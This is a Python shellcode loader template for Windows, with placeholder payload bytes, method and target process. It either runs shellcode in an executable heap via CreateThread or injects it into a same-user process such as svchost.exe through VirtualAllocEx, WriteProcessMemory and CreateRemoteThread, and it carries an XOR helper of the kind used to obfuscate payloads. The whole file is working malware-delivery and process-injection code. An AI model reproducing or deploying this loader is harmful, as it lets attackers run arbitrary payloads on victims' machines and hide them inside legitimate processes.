def main():
    import os
    import ctypes
    import ctypes.wintypes as wt
    import platform
    import numpy
    import random
    import psutil



    buf_x86 =  b"buf_x86_placeholder"

    buf_x64 =  b"buf_x64_placeholder"


    method = "METHOD_PLACEHOLDER"
    preferred_process = "PREFERRED_PROCESS_PLACEHOLDER"

    if platform.architecture()[0] == '64bit':
        print('[*] 64-Bit Python Interpreter')
        shellcode = buf_x64
    else:
        print('[*] 32-Bit Python Interpreter')
        shellcode = buf_x86

    HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
    HEAP_ZERO_MEMORY = 0x00000008

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READ_EXECUTE = 0x20

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [wt.HANDLE]
    CloseHandle.restype = wt.BOOL

    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID]
    CreateRemoteThread.restype = wt.HANDLE

    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]

    HeapCreate = ctypes.windll.kernel32.HeapCreate
    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    HeapCreate.restype = wt.HANDLE

    HeapAlloc = ctypes.windll.kernel32.HeapAlloc
    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    HeapAlloc.restype = wt.LPVOID

    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
    OpenProcess.restype = wt.HANDLE

    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD]
    VirtualAllocEx.restype = wt.LPVOID

    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
    VirtualProtectEx.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID]
    VirtualProtectEx.restype = wt.BOOL

    WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [
        wt.HANDLE, wt.LPVOID, wt.LPCVOID, ctypes.c_size_t, wt.LPVOID]
    WriteProcessMemory.restype = wt.BOOL

    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)



    def execute():
        heap = HeapCreate(
            HEAP_CREATE_ENABLE_EXECUTE, len(shellcode), 0)
        HeapAlloc(heap, HEAP_ZERO_MEMORY, len(shellcode))
        print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))
        RtlMoveMemory(heap, shellcode, len(shellcode))
        print('[*] Shellcode copied into memory.')
        thread = CreateThread(0, 0, heap, 0, 0, 0)
        print('[*] CreateThread() in same process.')
        WaitForSingleObject(thread, 0xFFFFFFFF)

    def inject():
        pid = find_process(preferred_process)
        if pid is None:
            return
        ph = OpenProcess(PROCESS_SOME_ACCESS, False, pid)
        print('[*] PID {:d} handle is: 0x{:06X}'.format(pid, ph))
        if ph == 0:
            print("[-] ERROR: OpenProcess(): {}".format(kernel32.GetLastError()))
            return

        memptr = VirtualAllocEx(ph, 0, len(shellcode),
            MEM_COMMIT_RESERVE, PAGE_READWRITE
        )
        print('[*] VirtualAllocEx() memory at: 0x{:08X}'.format(memptr))
        if memptr == 0:
            print("[-] ERROR: VirtualAllocEx(): {}".format(kernel32.GetLastError()))
            return

        nbytes = ctypes.c_int(0)
        result = WriteProcessMemory(ph, memptr, shellcode,
            len(shellcode), ctypes.byref(nbytes)
        )
        print('[+] Bytes written = {}'.format(nbytes.value))
        if result == 0:
            print("[-] ERROR: WriteProcessMemory(): {}".format(kernel32.GetLastError()))
            return

        old_protection = ctypes.pointer(wt.DWORD())
        result = VirtualProtectEx(ph, memptr, len(shellcode),
            PAGE_READ_EXECUTE, old_protection
        )
        if result == 0:
            print("[-] ERROR: VirtualProtextEx(): {}".format(kernel32.GetLastError()))
            return

        th = CreateRemoteThread(ph, None, 0, memptr, None, 0, None)
        if th == 0:
            print("[-] ERROR: CreateRemoteThread(): {}".format(kernel32.GetLastError()))
            return
        CloseHandle(ph)

    def xorstr(data, k):
        m = int(len(data) / len(k))
        r = len(data) % len(k)
        newkey = k * m + k[:r]
        res = numpy.bitwise_xor(bytearray(data), bytearray(newkey))
        return bytes(res)

    def find_process(preferred='svchost.exe'):
        domain = os.getenv('USERDOMAIN')
        name = os.getenv('USERNAME')
        username = '{}\\{}'.format(domain, name).lower()

        candidates = {}
        for pid in psutil.pids():
            p = psutil.Process(pid)
            try:
                name = p.name()
                procuser = p.username().lower()
            except:
                continue
            if procuser == username and name.lower() == preferred:
                candidates[pid] = name

        if len(candidates) == 0:
            print('[-] ERROR: No suitable process found.')
            return None
        
        choice = random.choice(list(candidates.keys()))
        print('[*] Selected Process ID: {} ({}) to Inject'.format(
            choice, candidates[choice]
        ))
        return int(choice)
    
    
    if method == 0:
        execute()
    elif method == 1:
        inject()



main()